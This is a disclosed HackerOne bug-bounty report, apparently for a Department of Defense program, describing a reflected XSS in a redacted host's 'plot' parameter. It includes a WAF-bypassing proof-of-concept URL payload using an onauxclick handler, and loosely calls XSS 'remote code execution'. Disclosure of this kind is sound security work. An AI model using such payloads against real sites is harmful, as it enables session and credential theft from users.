---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1736433'
original_report_id: '1736433'
title: Reflected XSS | https://████████
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2022-10-16T00:49:16.459Z'
disclosed_at: '2022-11-18T18:33:38.834Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS | https://████████

## Metadata

- HackerOne Report ID: 1736433
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2022-11-18T18:33:38.834Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Summary

Hi team, there's a reflected XSS on https://████ using the `plot` param. There's a WAF in place but it's possible to bypass it.
Steps to reproduce

1. Click https://██████████/fcgi-bin/getplot.py?plot=aaa%3Ch1%20onauxclick=confirm(document.domain)%3ERIGHT%20CLICK%20HERE
2. Observe the popup showing document.domain when right clicking "RIGHT CLICK HERE"

███

## Impact

The attacker can trigger remote code execution on the victim’s browser, and steal credentials, sessions, and potentially send malware to the victim.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Click https://████████/fcgi-bin/getplot.py?plot=aaa%3Ch1%20onauxclick=confirm(document.domain)%3ERIGHT%20CLICK%20HERE
2. Observe the popup showing document.domain when right clicking "RIGHT CLICK HERE"

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
